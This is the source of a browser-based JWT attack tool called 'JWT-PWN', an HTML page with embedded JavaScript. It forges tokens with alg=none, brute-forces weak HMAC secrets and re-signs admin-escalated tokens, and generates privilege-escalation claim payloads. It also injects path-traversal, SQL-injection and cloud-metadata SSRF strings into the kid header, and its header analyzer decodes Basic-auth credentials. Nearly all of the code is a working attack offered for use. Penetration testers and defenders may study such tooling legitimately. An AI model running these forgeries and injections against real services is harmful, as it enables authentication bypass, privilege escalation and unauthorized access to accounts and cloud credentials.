<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>JWT-PWN | Auth Analyzer + Attack Suite</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Syne:wght@700;800&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #0b0e12; --bg2: #111418; --bg3: #181c22;
    --border: #222830; --border-bright: #2e3540;
    --teal: #00e6c8; --teal-dim: #00a090;
    --red: #ff4d4d; --yellow: #ffd600; --green: #39d98a;
    --text: #c8d0db; --text-dim: #5a6270; --text-bright: #eef2f7;
    --font-mono: 'JetBrains Mono', monospace;
    --font-display: 'Syne', sans-serif;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: var(--bg); color: var(--text); font-family: var(--font-mono); min-height: 100vh; }

  /* ─ Layout ─ */
  .shell { display: grid; grid-template-rows: auto 1fr; height: 100vh; }
  .header {
    background: var(--bg2); border-bottom: 1px solid var(--border);
    padding: 0 24px; display: flex; align-items: center; gap: 20px; height: 52px;
  }
  .logo { font-family: var(--font-display); font-size: 22px; font-weight: 800; color: var(--teal); letter-spacing: -0.5px; }
  .logo span { color: var(--text-dim); font-size: 12px; font-family: var(--font-mono); font-weight: 300; margin-left: 8px; vertical-align: middle; }
  .badge { background: var(--red); color: #fff; font-size: 9px; font-weight: 700; padding: 2px 6px; border-radius: 2px; letter-spacing: 1px; }

  .main { display: grid; grid-template-columns: 420px 1fr; overflow: hidden; }
  .left-panel { border-right: 1px solid var(--border); display: flex; flex-direction: column; overflow-y: auto; }
  .right-panel { display: flex; flex-direction: column; overflow: hidden; }

  /* ─ Sections ─ */
  .section { padding: 16px; border-bottom: 1px solid var(--border); }
  .section-title {
    font-size: 10px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase;
    color: var(--text-dim); margin-bottom: 10px; display: flex; align-items: center; gap: 8px;
  }
  .section-title::after { content: ''; flex: 1; height: 1px; background: var(--border); }

  /* ─ Inputs ─ */
  textarea, input[type=text] {
    width: 100%; background: var(--bg3); color: var(--text-bright);
    border: 1px solid var(--border); padding: 10px 12px;
    font-family: var(--font-mono); font-size: 11.5px; line-height: 1.5;
    resize: vertical; outline: none; transition: border .15s;
  }
  textarea:focus, input:focus { border-color: var(--teal-dim); }
  textarea { min-height: 80px; }
  input[type=text] { resize: none; }

  /* ─ Buttons ─ */
  .btn-row { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 8px; }
  .btn {
    background: var(--bg3); color: var(--text); border: 1px solid var(--border-bright);
    padding: 7px 14px; font-family: var(--font-mono); font-size: 11px; font-weight: 600;
    cursor: pointer; transition: all .15s; white-space: nowrap; letter-spacing: 0.5px;
  }
  .btn:hover { background: var(--border-bright); color: var(--text-bright); }
  .btn.primary { background: var(--teal-dim); color: #000; border-color: var(--teal-dim); }
  .btn.primary:hover { background: var(--teal); }
  .btn.danger  { background: #3a0000; color: var(--red); border-color: #5a1010; }
  .btn.danger:hover { background: #5a0000; }
  .btn.running { opacity: .6; pointer-events: none; }
  .btn-icon { font-size: 13px; }

  /* ─ Tab bar ─ */
  .tab-bar { display: flex; border-bottom: 1px solid var(--border); background: var(--bg2); flex-shrink: 0; }
  .tab {
    padding: 10px 18px; font-size: 11px; font-weight: 600; letter-spacing: 0.5px;
    cursor: pointer; color: var(--text-dim); border-bottom: 2px solid transparent;
    transition: all .15s; user-select: none;
  }
  .tab.active { color: var(--teal); border-bottom-color: var(--teal); }
  .tab:hover:not(.active) { color: var(--text); }

  /* ─ Output ─ */
  .output-wrap { flex: 1; overflow-y: auto; padding: 16px; }
  .output {
    background: var(--bg2); border: 1px solid var(--border);
    padding: 14px; font-size: 11.5px; line-height: 1.7; white-space: pre-wrap;
    word-break: break-all; min-height: 200px; color: var(--text);
  }
  .out-section { margin-bottom: 12px; }
  .out-h { color: var(--teal); font-weight: 700; font-size: 10px; letter-spacing: 2px; margin-bottom: 4px; }
  .out-token { color: var(--yellow); word-break: break-all; font-size: 10.5px; }
  .out-warn  { color: var(--yellow); }
  .out-crit  { color: var(--red); font-weight: 700; }
  .out-ok    { color: var(--green); }
  .out-dim   { color: var(--text-dim); }
  .out-key   { color: var(--teal); }
  .out-val   { color: var(--text-bright); }

  /* ─ Claims table ─ */
  .claims-table { width: 100%; border-collapse: collapse; font-size: 11px; }
  .claims-table td { padding: 3px 8px; border-bottom: 1px solid var(--border); }
  .claims-table td:first-child { color: var(--teal); width: 120px; }
  .claims-table td:last-child { color: var(--text-dim); font-size: 10px; }

  /* ─ Severity badges ─ */
  .sev { font-size: 9px; font-weight: 700; padding: 2px 5px; letter-spacing: 1px; }
  .sev-CRITICAL { background: var(--red); color: #000; }
  .sev-HIGH     { background: #ff7700; color: #000; }
  .sev-MEDIUM   { background: var(--yellow); color: #000; }
  .sev-LOW      { background: #2a5; color: #000; }
  .sev-INFO     { background: var(--bg3); color: var(--teal); border: 1px solid var(--teal-dim); }

  /* ─ Forge panel ─ */
  .forge-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 8px; }
  label.lbl { display: block; font-size: 10px; color: var(--text-dim); margin-bottom: 4px; letter-spacing: 1px; text-transform: uppercase; }

  /* ─ Copy button ─ */
  .copy-btn { float: right; font-size: 9px; padding: 2px 6px; cursor: pointer; background: var(--bg3); border: 1px solid var(--border-bright); color: var(--text-dim); }
  .copy-btn:hover { color: var(--teal); }

  /* ─ Scrollbar ─ */
  ::-webkit-scrollbar { width: 6px; } ::-webkit-scrollbar-track { background: var(--bg); }
  ::-webkit-scrollbar-thumb { background: var(--border-bright); border-radius: 3px; }

  /* ─ Placeholder ─ */
  .placeholder { color: var(--text-dim); font-size: 12px; padding: 40px 0; text-align: center; }
  .placeholder .big { font-size: 28px; margin-bottom: 8px; }
</style>
</head>
<body>
<div class="shell">
  <!-- Header -->
  <header class="header">
    <div class="logo">JWT-PWN <span>Auth Analyzer + Attack Suite</span></div>
    <span class="badge">PENTEST</span>
    <span style="margin-left:auto;font-size:10px;color:var(--text-dim)">v1.0.0 · browser-native · no server</span>
  </header>

  <div class="main">
    <!-- Left panel: input + config -->
    <div class="left-panel">

      <!-- Token input -->
      <div class="section">
        <div class="section-title">Input</div>
        <label class="lbl">JWT or Authorization Header</label>
        <textarea id="tokenInput" rows="5" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
─── or ───
Authorization: Bearer eyJhbGc...
─── or ───
Paste full HTTP request headers"></textarea>
        <div class="btn-row">
          <button class="btn primary" onclick="doAnalyze()">⚡ Analyze</button>
          <button class="btn" onclick="doRunAll()">🚨 Run All Attacks</button>
          <button class="btn" onclick="clearAll()">✕ Clear</button>
        </div>
      </div>

      <!-- Individual attacks -->
      <div class="section">
        <div class="section-title">Attacks</div>
        <div class="btn-row">
          <button class="btn" onclick="doNoneAlg()">None Alg</button>
          <button class="btn" onclick="doBrute()">🔑 Brute Force</button>
          <button class="btn" onclick="doPrivEsc()">👑 Priv Esc</button>
          <button class="btn" onclick="doKidInject()">💉 KID Inject</button>
        </div>
      </div>

      <!-- Forge -->
      <div class="section">
        <div class="section-title">Forge Token</div>
        <label class="lbl">Override Claims (JSON)</label>
        <textarea id="forgeClaims" rows="2" placeholder='{"role":"admin","is_admin":true,"exp":9999999999}'></textarea>
        <label class="lbl" style="margin-top:8px">HMAC Secret (blank = none-alg)</label>
        <input type="text" id="forgeSecret" placeholder="your-secret-here">
        <div class="btn-row"><button class="btn primary" onclick="doForge()">🔨 Forge Token</button></div>
      </div>

      <!-- Header analyzer -->
      <div class="section">
        <div class="section-title">Header Analyzer</div>
        <textarea id="headersInput" rows="5" placeholder="Paste raw HTTP headers:
Authorization: Bearer eyJ...
X-Api-Key: abc123
Cookie: session=xyz; token=eyJ..."></textarea>
        <div class="btn-row"><button class="btn" onclick="doAnalyzeHeaders()">🔍 Analyze Headers</button></div>
      </div>
    </div>

    <!-- Right panel: output -->
    <div class="right-panel">
      <div class="tab-bar">
        <div class="tab active" onclick="switchTab('results')">Results</div>
        <div class="tab" onclick="switchTab('raw')">Raw Tokens</div>
        <div class="tab" onclick="switchTab('help')">Help</div>
      </div>
      <div class="output-wrap" id="outputWrap">
        <div id="tab-results">
          <div class="placeholder"><div class="big">🔐</div>Paste a JWT and click Analyze or Run All Attacks</div>
        </div>
        <div id="tab-raw" style="display:none">
          <div class="output" id="rawOutput"><span class="out-dim">Forged tokens will appear here...</span></div>
        </div>
        <div id="tab-help" style="display:none">
          <div class="output" id="helpContent"></div>
        </div>
      </div>
    </div>
  </div>
</div>

<script>
// ── Crypto helpers ─────────────────────────────────────────────────────────────

function b64urlDecode(s) {
  s = s.replace(/-/g,'+').replace(/_/g,'/');
  while (s.length%4) s+='=';
  return atob(s);
}
function b64urlEncode(s) {
  return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
}
function b64urlEncodeBytes(bytes) {
  let s = '';
  for (const b of bytes) s += String.fromCharCode(b);
  return b64urlEncode(s);
}

function parseJWT(token) {
  const parts = token.trim().split('.');
  if (parts.length !== 3) return null;
  try {
    const header  = JSON.parse(b64urlDecode(parts[0]));
    const payload = JSON.parse(b64urlDecode(parts[1]));
    return { header, payload, sig: parts[2], parts };
  } catch { return null; }
}

async function hmacSign(secret, data, alg) {
  const enc = new TextEncoder();
  const hashName = alg==='HS256'?'SHA-256':alg==='HS384'?'SHA-384':'SHA-512';
  const key = await crypto.subtle.importKey('raw', enc.encode(secret),
    {name:'HMAC',hash:hashName}, false, ['sign']);
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(data));
  return b64urlEncodeBytes(new Uint8Array(sig));
}

async function buildJWT(header, payload, secret='', overrideAlg=null) {
  if (overrideAlg) header = {...header, alg: overrideAlg};
  const h = b64urlEncode(JSON.stringify(header));
  const p = b64urlEncode(JSON.stringify(payload));
  const si = `${h}.${p}`;
  const alg = (header.alg||'none').toUpperCase();
  if (alg==='NONE'||!secret) return `${si}.`;
  if (['HS256','HS384','HS512'].includes(alg)) {
    const sig = await hmacSign(secret, si, alg);
    return `${si}.${sig}`;
  }
  return `${si}.`;
}

const WEAK_SECRETS = [
  'secret','password','123456','jwt','token','admin','changeme','mysecret',
  'secretkey','your-256-bit-secret','development','test','','key',
  'jwt_secret','supersecret','default','flask-unsign','production',
];

async function bruteForce(token) {
  const parsed = parseJWT(token);
  if (!parsed) return null;
  const {header, parts} = parsed;
  const alg = (header.alg||'').toUpperCase();
  if (!alg.startsWith('HS')) return null;
  const si = `${parts[0]}.${parts[1]}`;
  const hashName = alg==='HS256'?'SHA-256':alg==='HS384'?'SHA-384':'SHA-512';
  const enc = new TextEncoder();
  let expected;
  try {
    const raw = b64urlDecode(parts[2]);
    expected = Uint8Array.from(raw, c=>c.charCodeAt(0));
  } catch { return null; }
  for (const s of WEAK_SECRETS) {
    try {
      const key = await crypto.subtle.importKey('raw', enc.encode(s),
        {name:'HMAC',hash:hashName}, false, ['sign']);
      const computed = new Uint8Array(await crypto.subtle.sign('HMAC', key, enc.encode(si)));
      if (computed.length===expected.length && computed.every((b,i)=>b===expected[i])) return s;
    } catch {continue;}
  }
  return null;
}

// ── Output helpers ──────────────────────────────────────────────────────────

function getToken() {
  let t = document.getElementById('tokenInput').value.trim();
  if (t.toLowerCase().startsWith('authorization:')) {
    t = t.split(':',2)[1].trim();
  }
  if (t.toLowerCase().startsWith('bearer ')) t = t.slice(7).trim();
  // Extract first JWT-looking string
  const m = t.match(/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/);
  return m ? m[0] : t.split('\n')[0].trim();
}

function el(id) { return document.getElementById(id); }
function clearAll() {
  el('tokenInput').value=''; el('headersInput').value='';
  el('forgeClaims').value=''; el('forgeSecret').value='';
  el('tab-results').innerHTML='<div class="placeholder"><div class="big">🔐</div>Paste a JWT and click Analyze or Run All Attacks</div>';
  el('rawOutput').innerHTML='<span class="out-dim">Forged tokens will appear here...</span>';
}
function switchTab(name) {
  ['results','raw','help'].forEach(t => {
    el('tab-'+t).style.display = t===name?'':'none';
    document.querySelectorAll('.tab').forEach((tab,i) => {
      if (['results','raw','help'][i]===name) tab.classList.add('active');
      else tab.classList.remove('active');
    });
  });
}

function claimAnnotation(key, val) {
  const now = Math.floor(Date.now()/1000);
  if (key==='exp' && typeof val==='number') {
    const diff = val - now;
    if (diff < 0) return `<span class="out-warn">⚠ EXPIRED ${Math.round(-diff/60)}m ago</span>`;
    if (diff < 300) return `<span class="out-warn">⚠ expires in ${diff}s</span>`;
    return `<span class="out-ok">✓ valid ${Math.round(diff/3600)}h</span>`;
  }
  if (key==='iat' && typeof val==='number') return `<span class="out-dim">issued ${Math.round((now-val)/3600)}h ago</span>`;
  if (['role','roles','is_admin','admin','privilege'].includes(key)) return `<span class="out-warn">⚠ privilege — escalation target</span>`;
  if (['sub','user_id','uid','id'].includes(key)) return `<span class="out-dim">identity — IDOR target</span>`;
  return '';
}

function algBadge(alg) {
  const a = (alg||'?').toUpperCase();
  if (a==='NONE') return `<span class="sev sev-CRITICAL">CRITICAL</span> none — no signature`;
  if (a.startsWith('HS')) return `<span class="sev sev-HIGH">HIGH</span> ${alg} — symmetric HMAC, brute-forceable`;
  if (a.startsWith('RS')) return `<span class="sev sev-LOW">LOW</span> ${alg} — asymmetric RSA`;
  if (a.startsWith('ES')) return `<span class="sev sev-LOW">LOW</span> ${alg} — elliptic curve`;
  return `<span class="sev sev-HIGH">UNKNOWN</span> ${alg}`;
}

function renderResults(html) {
  el('tab-results').innerHTML = html;
  switchTab('results');
}

function tokenToRaw(label, token) {
  el('rawOutput').innerHTML += `\n<div class="out-h">${label}</div><div class="out-token">${token}</div><button class="copy-btn" onclick="navigator.clipboard.writeText('${token.replace(/'/g,"\\'")}')">copy</button>\n\n`;
  switchTab('raw');
}

// ── Actions ───────────────────────────────────────────────────────────────────

function doAnalyze() {
  const token = getToken();
  const parsed = parseJWT(token);
  if (!parsed) {
    renderResults('<div class="output"><span class="out-crit">[!] Not a valid JWT</span></div>');
    return;
  }
  const {header, payload} = parsed;
  const alg = header.alg || '?';
  const now = Math.floor(Date.now()/1000);

  let html = '<div class="output">';
  html += `<div class="out-h">JWT STRUCTURE</div>`;

  // Header
  html += `<div class="out-section"><span class="out-key">HEADER</span><table class="claims-table">`;
  for (const [k,v] of Object.entries(header)) {
    const risk = k==='alg'&&(v.toUpperCase()==='NONE'||v.toUpperCase().startsWith('HS')) ? `<span class="out-warn">⚠</span>` :
                 k==='kid'||k==='jku'||k==='x5u' ? `<span class="out-crit">⚠ injection target</span>` : '';
    html += `<tr><td>${k}</td><td>${JSON.stringify(v)} ${risk}</td><td></td></tr>`;
  }
  html += '</table></div>';

  // Payload
  html += `<div class="out-section"><span class="out-key">PAYLOAD</span><table class="claims-table">`;
  for (const [k,v] of Object.entries(payload)) {
    html += `<tr><td>${k}</td><td>${JSON.stringify(v)}</td><td>${claimAnnotation(k,v)}</td></tr>`;
  }
  html += '</table></div>';

  // Flags
  html += `<div class="out-section"><span class="out-key">SECURITY FLAGS</span>`;
  const exp = payload.exp;
  const flags = [
    ['Algorithm',       algBadge(alg),                                    true],
    ['KID header',      'kid' in header ? `<span class="out-crit">⚠ present: ${header.kid}</span>` : '<span class="out-ok">✓ absent</span>', true],
    ['JKU/X5U header',  'jku' in header||'x5u' in header ? `<span class="out-crit">⚠ present — JWKS URL spoofing risk</span>` : '<span class="out-ok">✓ absent</span>', true],
    ['Expiry',          exp ? (exp<now ? `<span class="out-warn">⚠ EXPIRED</span>` : `<span class="out-ok">✓ valid</span>`) : '<span class="out-warn">⚠ no exp claim</span>', true],
    ['Privilege claims', ['role','is_admin','admin','privilege'].some(k=>k in payload) ? `<span class="out-warn">⚠ ${['role','is_admin','admin','privilege'].filter(k=>k in payload).join(', ')}</span>` : '<span class="out-ok">✓ none</span>', true],
  ];
  for (const [name, val] of flags) {
    html += `<div><span class="out-dim" style="display:inline-block;width:140px">${name}</span>${val}</div>`;
  }
  html += '</div></div>';
  renderResults(html);
}

async function doNoneAlg() {
  const token = getToken();
  const parsed = parseJWT(token);
  if (!parsed) { renderResults('<div class="output"><span class="out-crit">[!] Invalid JWT</span></div>'); return; }
  const {header, payload} = parsed;
  let html = '<div class="output"><div class="out-h">NONE ALGORITHM BYPASS</div>';
  html += '<span class="out-dim">Try each variant — parsers handle casing differently</span>\n\n';
  for (const v of ['none','None','NONE','nOnE','noNe','NonE']) {
    const forged = await buildJWT({...header}, payload, '', v);
    html += `<div class="out-key">alg=${v}</div><div class="out-token">${forged}</div><button class="copy-btn" onclick="navigator.clipboard.writeText(this.previousElementSibling.textContent)">copy</button>\n\n`;
  }
  html += '</div>';
  renderResults(html);
}

async function doBrute() {
  renderResults('<div class="output"><span class="out-dim">Brute forcing HMAC secret...</span></div>');
  const token = getToken();
  const cracked = await bruteForce(token);
  const parsed = parseJWT(token);
  if (!parsed) return;
  const {header, payload} = parsed;
  let html = '<div class="output"><div class="out-h">HMAC BRUTE FORCE</div>';
  if (cracked !== null) {
    const p2 = {...payload, role:'admin', is_admin:true};
    const escalated = await buildJWT({...header}, p2, cracked);
    html += `<div class="out-crit" style="font-size:14px">[!!!] SECRET CRACKED: "${cracked}"</div>\n\n`;
    html += `<div class="out-key">Privilege-escalated + re-signed token:</div>`;
    html += `<div class="out-token">${escalated}</div>`;
    html += `<button class="copy-btn" onclick="navigator.clipboard.writeText(this.previousElementSibling.textContent)">copy</button>`;
  } else {
    html += `<span class="out-ok">[✓] No weak secret found in built-in list (${WEAK_SECRETS.length} candidates)</span>\n`;
    html += `<span class="out-dim">Try again with a custom wordlist using the Python CLI:\n  python jwt_pwn.py attack -t "..." -w rockyou.txt</span>`;
  }
  html += '</div>';
  renderResults(html);
}

async function doPrivEsc() {
  const token = getToken();
  const parsed = parseJWT(token);
  if (!parsed) return;
  const {header, payload} = parsed;
  let html = '<div class="output"><div class="out-h">PRIVILEGE ESCALATION PAYLOADS</div>';
  html += '<span class="out-dim">Unsigned — combine with none-alg bypass or cracked secret\n\n</span>';
  const escalations = [
    {role:'admin'}, {is_admin:true}, {admin:true}, {privilege:'admin'},
    {roles:['admin','superadmin']}, {role:'superuser'}, {group:'admin'},
  ];
  for (const ch of escalations) {
    const forged = await buildJWT({...header}, {...payload, ...ch});
    html += `<div class="out-key">${JSON.stringify(ch)}</div>`;
    html += `<div class="out-token">${forged}</div>`;
    html += `<button class="copy-btn" onclick="navigator.clipboard.writeText(this.previousElementSibling.textContent)">copy</button>\n\n`;
  }
  html += '</div>';
  renderResults(html);
}

async function doKidInject() {
  const token = getToken();
  const parsed = parseJWT(token);
  if (!parsed) return;
  const {header, payload} = parsed;
  let html = '<div class="output"><div class="out-h">KID HEADER INJECTION</div>';
  if (!('kid' in header)) {
    html += '<span class="out-ok">[✓] No kid header present — not directly applicable</span>\n';
    html += '<span class="out-dim">kid injection tests what happens when server uses kid to locate a signing key</span>';
  } else {
    html += `<span class="out-warn">⚠ kid found: ${header.kid}\n\n</span>`;
    const injections = [
      ['Path Traversal (/dev/null)', '../../dev/null'],
      ['Path Traversal (empty file)', '/proc/sys/kernel/ostype'],
      ['SQL Injection',              "' UNION SELECT 'pwned'--"],
      ['SQL Injection (int)',        "1 UNION SELECT 'secret'--"],
      ['SSRF',                       'http://169.254.169.254/latest/meta-data/'],
      ['Empty string',               ''],
    ];
    for (const [label, inj] of injections) {
      const forged = await buildJWT({...header, kid:inj}, payload, '', header.alg);
      html += `<div class="out-key">${label}</div><div class="out-dim" style="font-size:10px">kid = "${inj}"</div>`;
      html += `<div class="out-token">${forged}</div>`;
      html += `<button class="copy-btn" onclick="navigator.clipboard.writeText(this.previousElementSibling.textContent)">copy</button>\n\n`;
    }
  }
  html += '</div>';
  renderResults(html);
}

async function doRunAll() {
  renderResults('<div class="output"><span class="out-dim">Running all attacks...</span></div>');
  const token = getToken();
  const parsed = parseJWT(token);
  if (!parsed) {
    renderResults('<div class="output"><span class="out-crit">[!] Invalid JWT</span></div>'); return;
  }
  const {header, payload} = parsed;
  const alg = header.alg || '?';
  const now = Math.floor(Date.now()/1000);
  let html = '<div class="output">';

  // Analysis
  html += '<div class="out-h">ANALYSIS</div>';
  html += `<div><span class="out-dim" style="width:120px;display:inline-block">Algorithm</span> ${algBadge(alg)}</div>`;
  html += `<div><span class="out-dim" style="width:120px;display:inline-block">KID</span> ${'kid' in header ? '<span class="out-warn">⚠ '+header.kid+'</span>' : '<span class="out-ok">✓ absent</span>'}</div>`;
  html += `<div><span class="out-dim" style="width:120px;display:inline-block">JKU</span> ${'jku' in header ? '<span class="out-crit">⚠ '+header.jku+'</span>' : '<span class="out-ok">✓ absent</span>'}</div>`;
  const exp = payload.exp;
  html += `<div><span class="out-dim" style="width:120px;display:inline-block">Expiry</span> ${exp?(exp<now?'<span class="out-warn">⚠ EXPIRED</span>':'<span class="out-ok">✓ valid</span>'):'<span class="out-warn">⚠ no exp</span>'}</div>`;
  html += '\n';

  // None alg
  html += '<div class="out-h">1. NONE ALGORITHM</div>';
  for (const v of ['none','None','NONE','nOnE']) {
    const f = await buildJWT({...header}, payload, '', v);
    html += `<span class="out-dim">alg=${v.padEnd(6)}: </span><span class="out-token">${f.substring(0,90)}...</span> <button class="copy-btn" onclick="navigator.clipboard.writeText('${f.replace(/'/g,"\\'")}')">copy</button>\n`;
  }
  html += '\n';

  // Brute force
  html += '<div class="out-h">2. HMAC BRUTE FORCE</div>';
  const cracked = await bruteForce(token);
  if (cracked !== null) {
    const p2 = {...payload, role:'admin', is_admin:true};
    const escalated = await buildJWT({...header}, p2, cracked);
    html += `<span class="out-crit">[!!!] SECRET CRACKED: "${cracked}"</span>\n`;
    html += `<span class="out-key">Escalated: </span><span class="out-token">${escalated.substring(0,80)}...</span> <button class="copy-btn" onclick="navigator.clipboard.writeText('${escalated.replace(/'/g,"\\'")}')">copy</button>\n`;
  } else {
    html += `<span class="out-ok">[✓] No weak secret found (${WEAK_SECRETS.length} candidates)</span>\n`;
  }
  html += '\n';

  // Priv esc
  html += '<div class="out-h">3. PRIVILEGE ESCALATION</div>';
  for (const ch of [{role:'admin'},{is_admin:true},{admin:true}]) {
    const f = await buildJWT({...header},{...payload,...ch});
    const k = Object.keys(ch)[0];
    html += `<span class="out-dim">${(k+'='+JSON.stringify(ch[k])).padEnd(20)}: </span><span class="out-token">${f.substring(0,80)}...</span> <button class="copy-btn" onclick="navigator.clipboard.writeText('${f.replace(/'/g,"\\'")}')">copy</button>\n`;
  }
  html += '\n';

  // KID
  html += '<div class="out-h">4. KID INJECTION</div>';
  if ('kid' in header) {
    for (const [lbl, inj] of [['../dev/null','../../dev/null'],["SQLi","' UNION SELECT 'x'--"]]) {
      const f = await buildJWT({...header, kid:inj}, payload, '', header.alg);
      html += `<span class="out-warn">${lbl.padEnd(20)}: </span><span class="out-token">${f.substring(0,80)}...</span> <button class="copy-btn" onclick="navigator.clipboard.writeText('${f.replace(/'/g,"\\'")}')">copy</button>\n`;
    }
  } else { html += '<span class="out-ok">[✓] No kid header</span>\n'; }
  html += '\n';

  // Summary
  html += '<div class="out-h">SUMMARY</div>';
  const issues = [];
  const a = alg.toUpperCase();
  if (a==='NONE') issues.push(['CRITICAL','Algorithm is none']);
  if (cracked!==null) issues.push(['CRITICAL',`HMAC secret cracked: "${cracked}"`]);
  if (a.startsWith('HS')) issues.push(['HIGH','Symmetric HMAC — offline brute-force possible']);
  if ('kid' in header) issues.push(['MEDIUM','KID header — injection vector']);
  if ('jku' in header) issues.push(['HIGH','JKU header — JWKS URL spoofing']);
  if (exp && exp<now) issues.push(['MEDIUM','Token is expired']);
  if (['role','is_admin','admin','privilege'].some(k=>k in payload)) issues.push(['LOW','Privilege claims present — try escalation']);
  if (!issues.length) issues.push(['INFO','No obvious issues found']);
  for (const [sev, msg] of issues) {
    html += `<span class="sev sev-${sev}">${sev}</span> ${msg}\n`;
  }
  html += '</div>';
  renderResults(html);
}

async function doForge() {
  const token = getToken();
  const secret = el('forgeSecret').value.trim();
  const claimsRaw = el('forgeClaims').value.trim();
  const parsed = parseJWT(token);
  if (!parsed) {
    renderResults('<div class="output"><span class="out-crit">[!] Invalid JWT</span></div>'); return;
  }
  const {header, payload} = parsed;
  let overrides = {};
  if (claimsRaw) {
    try { overrides = JSON.parse(claimsRaw); }
    catch { renderResults('<div class="output"><span class="out-crit">[!] Invalid JSON for claims</span></div>'); return; }
  }
  const newPayload = {...payload, ...overrides};
  const forged = await buildJWT({...header}, newPayload, secret);
  let html = '<div class="output"><div class="out-h">FORGED TOKEN</div>';
  html += `<div class="out-key">Header:</div>  ${JSON.stringify(header)}\n`;
  html += `<div class="out-key">Payload:</div> ${JSON.stringify(newPayload)}\n\n`;
  html += `<div class="out-key">Token:</div>\n<div class="out-token">${forged}</div>`;
  html += `<button class="copy-btn" onclick="navigator.clipboard.writeText(this.previousElementSibling.textContent)">copy</button>`;
  html += '</div>';
  renderResults(html);
}

function doAnalyzeHeaders() {
  const raw = el('headersInput').value.trim();
  let html = '<div class="output"><div class="out-h">HEADER ANALYSIS</div>';
  const lines = raw.split('\n');
  let found = false;
  for (const line of lines) {
    const hl = line.toLowerCase();
    if (hl.startsWith('authorization:')) {
      const val = line.split(':',2)[1].trim();
      if (val.toLowerCase().startsWith('bearer ')) {
        const tok = val.slice(7).trim();
        const parsed = parseJWT(tok);
        html += `<span class="sev sev-HIGH">HIGH</span> JWT Bearer Token\n`;
        if (parsed) {
          html += `  alg: ${parsed.header.alg||'?'}  |  claims: ${Object.keys(parsed.payload).join(', ')}\n`;
          if (parsed.header.kid) html += `  <span class="out-warn">⚠ kid: ${parsed.header.kid}</span>\n`;
        }
      } else if (val.toLowerCase().startsWith('basic ')) {
        try {
          const creds = atob(val.slice(6));
          html += `<span class="sev sev-CRITICAL">CRITICAL</span> HTTP Basic Auth — credentials: ${creds}\n`;
        } catch { html += `<span class="sev sev-CRITICAL">CRITICAL</span> HTTP Basic Auth detected\n`; }
      } else {
        html += `<span class="sev sev-MEDIUM">MEDIUM</span> Auth header: ${val.substring(0,60)}\n`;
      }
      found = true;
    } else if (/^x-api-key:|^api-key:|^x-auth-token:|^x-access-token:/i.test(line)) {
      html += `<span class="sev sev-MEDIUM">MEDIUM</span> API Key header: ${line}\n`;
      found = true;
    } else if (hl.startsWith('cookie:')) {
      const cookies = line.split(':',2)[1].split(';');
      for (const c of cookies) {
        if (/jwt|token|session|auth|access/i.test(c)) {
          html += `<span class="sev sev-MEDIUM">MEDIUM</span> Auth Cookie: ${c.trim()}\n`;
          found = true;
        }
      }
    }
  }
  if (!found) html += '<span class="out-dim">[INFO] No authentication headers detected</span>\n';
  html += '</div>';
  renderResults(html);
}
